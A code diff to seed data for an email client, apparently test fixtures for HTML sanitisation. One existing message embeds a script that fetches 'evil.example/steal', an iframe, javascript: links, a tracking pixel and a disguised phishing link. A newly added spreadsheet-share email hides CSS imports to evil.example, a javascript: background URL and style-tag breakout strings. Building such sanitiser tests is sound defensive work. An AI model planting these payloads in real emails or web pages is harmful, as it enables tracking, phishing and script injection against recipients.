@@ -66,6 +66,21 @@ const seeds: Seed[] = [
   { id: 'm11', thread: 't11', account: 'me', from: P.blue, subject: 'Introducing our new service lanes', html: `<div style="font-family:Arial;color:#222"><h2 style="color:#162328">New service lanes</h2><p>Dear partner,</p><p>We are pleased to announce <b>additional service lanes</b> starting next quarter. <a href="https://bluewave-lines.example/lanes">View the lane map</a>.</p><img src="https://tracker.example/pixel.gif?u=1" width="1" height="1" alt=""><img src="https://bluewave-lines.example/banner.png" alt="Lane map" width="320"><table border="1" cellpadding="6"><tr><th>Lane</th><th>Start</th></tr><tr><td>Jebel Ali – Rotterdam</td><td>Jan</td></tr></table><p>Phishing check: <a href="https://evil.example/login">https://bank.example/secure</a></p><script>document.title='pwned';fetch('https://evil.example/steal')</script><iframe src="https://evil.example"></iframe><p onclick="alert(1)" style="position:fixed;top:0;font-size:12px;color:#c00">Styled text</p><a href="javascript:alert(1)">Bad link</a><p>Liam</p></div>`, body: 'Dear partner,\n\nWe are pleased to announce additional service lanes starting next quarter.\n\nLiam', ago: 4300 },
   { id: 'm12', thread: 't12', account: 'me', folder: 'drafts', from: { name: 'Your Name', email: 'you@pivot.example' }, to: 'hana@acme-trading.example', subject: 'Draft: rate proposal', body: 'Hi Hana,\n\n[draft in progress]', ago: 200 },
   { id: 'm13', thread: 't13', account: 'me', folder: 'archive', from: P.sky, subject: 'Archived: last season schedule', body: 'For reference.\n\nNoor', ago: 9000 },
+  { id: 'm14', thread: 't14', account: 'me', folder: 'archive', from: { name: 'Hana Okafor (via Sheets)', email: 'drive-shares@sheets.example' }, subject: 'Spreadsheet shared with you: "Rate sheet Q1"', html: `<!doctype html><html><head><style>
+.preheader{display:none!important;max-height:0;overflow:hidden;mso-hide:all}
+.card{max-width:520px;margin:0 auto;border:1px solid #dadce0;border-radius:8px;padding:28px 24px;font-family:Arial,Helvetica,sans-serif}
+.avatar{border-radius:50%;width:40px;height:40px;display:block}
+.who{font-size:16px;color:#202124;padding-left:12px}
+.doc{display:inline-block;padding:8px 12px;border:1px solid #dadce0;border-radius:16px;color:#188038;font-weight:bold}
+.btn{display:inline-block;background-color:#1a73e8;color:#ffffff!important;text-decoration:none;padding:10px 24px;border-radius:4px;font-weight:bold}
+.foot{color:#5f6368;font-size:12px}
+@media only screen and (max-width:480px){.card{padding:16px 12px!important}}
+@import url(https://evil.example/x.css);
+@font-face{font-family:Spy;src:url(https://evil.example/font)}
+.spy{background-image:url(javascript:alert(1));position:fixed;top:0}
+.foot{font-family:"\\3c/style\\3e\\3cp id=inj\\3e"}
+[title="\\3c/style\\3e\\3cp id=inj2\\3e"]{color:red}
+</style></head><body><span class="preheader">Hana Okafor shared a spreadsheet</span><div class="card"><table><tr><td><img class="avatar" src="https://sheets.example/avatar.png" width="40" height="40" alt=""></td><td class="who">Hana Okafor shared a spreadsheet</td></tr></table><p><span class="doc">Rate sheet Q1</span></p><p><a class="btn" href="https://sheets.example/d/123">Open</a></p><p class="foot spy">You have received this email because someone shared a spreadsheet with you.</p></div></body></html>`, body: 'Hana Okafor shared a spreadsheet: Rate sheet Q1\nhttps://sheets.example/d/123', ago: 9500 },
 ]
 
 const accountOf = (id: string): Account => ACCOUNTS.find((a) => a.id === id) ?? (ACCOUNTS[0] as Account)
